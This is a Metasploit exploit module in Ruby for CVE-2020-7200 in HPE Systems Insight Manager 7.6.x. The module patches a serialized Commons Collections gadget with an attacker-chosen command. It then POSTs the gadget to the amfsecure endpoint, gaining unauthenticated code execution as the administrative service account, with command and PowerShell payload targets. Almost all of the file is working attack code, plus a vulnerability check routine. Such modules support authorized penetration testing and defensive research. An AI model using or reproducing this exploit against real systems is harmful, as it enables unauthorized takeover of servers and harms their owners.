# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HPE Systems Insight Manager AMF Deserialization RCE',
        'Description' => %q{
          A remotely exploitable vulnerability exists within HPE System Insight Manager (SIM) version 7.6.x that can be
          leveraged by a remote unauthenticated attacker to execute code within the context of HPE System Insight
          Manager's hpsimsvc.exe process, which runs with administrative privileges. The vulnerability occurs due
          to a failure to validate data during the deserialization process when a user submits a POST request to
          the /simsearch/messagebroker/amfsecure page. This module exploits this vulnerability by leveraging an
          outdated copy of Commons Collection, namely 3.2.2, that ships with HPE SIM, to gain
          RCE as the administrative user running HPE SIM.
        },
        'Author' => [
          'Harrison Neal', # Original bug finder, reported bug to ZDI
          'Jang', # Aka @testanull on Twitter, editor of nightst0rm, who wrote a very detailed writeup of this bug in Vietnamese
          'Grant Willcox' # Metasploit module author
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-7200'],
          ['URL', 'https://testbnull.medium.com/hpe-system-insight-manager-sim-amf-deserialization-lead-to-rce-cve-2020-7200-d49a9cf143c0'],
          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-20-1449/'],
          ['URL', 'https://support.hpe.com/hpesc/public/docDisplay?docLocale=en_US&docId=hpesbgn04068en_us']
        ],
        'Platform' => 'win',
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :windows_command,
              'Space' => 64000
            }
          ],
          [
            'Windows Powershell',
            {
              'Arch' => [ARCH_X64],
              'Type' => :windows_powershell,
              'Space' => 64000
            }
          ]
        ],
        'DefaultOptions' => {
          'RPORT' => 50000,
          'SSL' => true
        },
        'DefaultTarget' => 1,
        'DisclosureDate' => '2020-12-15',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
        'Privileged' => true
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The base path to the HPE SIM server', '/' ])
    ])
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return CheckCode::Unknown('Failed to connect to the server.') if res.nil?

    body = res.body
    unless body.include?('Please insert your Smart Card and login to HPE System Insight Manager.') && body.include?('<title>HPE Systems Insight Manager</title>') && body.include?('/ui/javascript/XeHelp.js')
      return CheckCode::Safe("Target doesn't appear to be a HPE System Insight Manager server!")
    end

    data_dir = File.join(Msf::Config.data_directory, 'exploits', shortname)
    f_handle = File.open(File.join(data_dir, 'emp.ser'), 'rb')
    serialized_payload_content = f_handle.read
    f_handle.close
    serialized_payload_content_final = payload_template_adjustments(serialized_payload_content, 'a') # NOP command of a which will allow for checking if the target is vulnerable.

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'simsearch', 'messagebroker', 'amfsecure'),
      'data' => serialized_payload_content_final
    })

    unless res&.code == 200
      return CheckCode::Safe("Non-200 HTTP response received during deserialization. Target doesn't seem to be vulnerable!")
    end
    unless res.to_s.include?('java.lang.NullPointerException')
      return CheckCode::Safe("200 OK response didn't contain expected java.lang.NullPointerException. Target is not vulnerable!")
    end

    CheckCode::Vulnerable('Target returned java.lang.NullPointerException in its 200 OK response!')
  end

  def exploit
    case target['Type']
    when :windows_command
      execute_command(payload.encoded.gsub(/^powershell(?:\.exe)* /, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ')) # If PowerShell is being used to run the command, specify the full path so that it will run correctly.
    when :windows_powershell
      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true).prepend('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\')) # Need full path to PowerShell binary for it to run for some reason.
    end
  end

  def payload_template_adjustments(original_content, cmd)
    original_content['PAYLOAD'] = cmd
    original_content[0x47A..0x47B] = [cmd.length].pack('n')
    second_adjustment_length = original_content[0x3C..].length * 2

    pack_array = []
    current_number = second_adjustment_length
    for count in 0...3
      if current_number >> 7 == 0
        break
      else
        if count == 2
          pack_array.prepend((current_number >> 8) | 0x80)
          break
        else
          pack_array.prepend((current_number >> 7) | 0x80)
          current_number >>= 7
        end
        count += 1
      end
    end
    pack_array.append((second_adjustment_length & 0x7F) + 1)
    original_content[0x3A..0x3B] = pack_array.pack('c*')

    original_content
  end

  def execute_command(cmd, _opts = {})
    data_dir = File.join(Msf::Config.data_directory, 'exploits', shortname)
    f_handle = File.open(File.join(data_dir, 'emp.ser'), 'rb')
    serialized_payload_content = f_handle.read
    f_handle.close
    serialized_payload_content_final = payload_template_adjustments(serialized_payload_content, cmd)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'simsearch', 'messagebroker', 'amfsecure'),
      'data' => serialized_payload_content_final
    })

    unless res&.code == 200
      fail_with(Failure::UnexpectedReply, 'Non-200 HTTP response received while trying to execute the command')
    end
    unless res.to_s.include?('java.lang.NullPointerException')
      fail_with(Failure::UnexpectedReply, 'Server should respond with a java.lang.NullPointerException upon successful deserialization, but no such message was received!')
    end
  end
end
